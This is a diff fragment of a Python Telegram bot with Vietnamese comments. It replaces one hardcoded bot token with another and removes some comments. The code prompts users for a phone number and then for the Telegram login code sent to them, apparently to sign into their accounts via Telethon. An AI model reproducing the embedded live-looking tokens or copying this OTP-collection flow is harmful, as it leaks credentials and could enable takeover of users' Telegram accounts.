@@ -18,7 +18,7 @@ from telethon.tl.types import InputPeerEmpty
 # ===== CẤU HÌNH TOKEN VÀ BIẾN MÔI TRƯỜNG =====
 # ==========================================
 
-TOKEN = os.getenv('BOT_TOKEN', '8483501766:AAHVDtoOksBVBrNIThiSzyYAyXzOTb19m4I')
+TOKEN = os.getenv('BOT_TOKEN', '8483501766:AAF3qsT9u6V-bB-hQI8ftJDiyISJHltFz_I')
 DATABASE_URL = os.getenv('DATABASE_URL', '')
 ADMIN_ID = 79079
 REQUIRED_GROUP = "@genplaycluod"
@@ -405,13 +405,11 @@ def callback_buy(call):
 def process_phone_input(msg):
     phone = msg.text.strip()
     
-    # Chuẩn hóa số điện thoại: nếu bắt đầu bằng 0 thì đổi thành +84
     if phone.startswith('0'):
         phone = '+84' + phone[1:]
     elif not phone.startswith('+'):
         phone = '+' + phone
 
-    # Kiểm tra định dạng số điện thoại đơn giản bằng regex
     if not re.match(r'^\+\d{10,15}$', phone):
         sent = bot.reply_to(msg, "❌ Số điện thoại không hợp lệ. Vui lòng nhập lại (Ví dụ: `+84912345678` hoặc `0912345678`):", parse_mode="Markdown")
         bot.register_next_step_handler(sent, process_phone_input)
@@ -467,7 +465,7 @@ def trigger_telegram_code(chat_id, user_id, phone):
         )
 
 def process_otp(msg, phone):
-    otp = msg.text.strip().replace(" ", "")  # Tự động loại bỏ dấu cách nếu người dùng lỡ gõ cách
+    otp = msg.text.strip().replace(" ", "")
     if not re.match(r'^\d{6}$', otp):
         sent = bot.reply_to(msg, "❌ Mã phải gồm đúng 6 chữ số. Nhập lại:")
         bot.register_next_step_handler(sent, process_otp, phone)
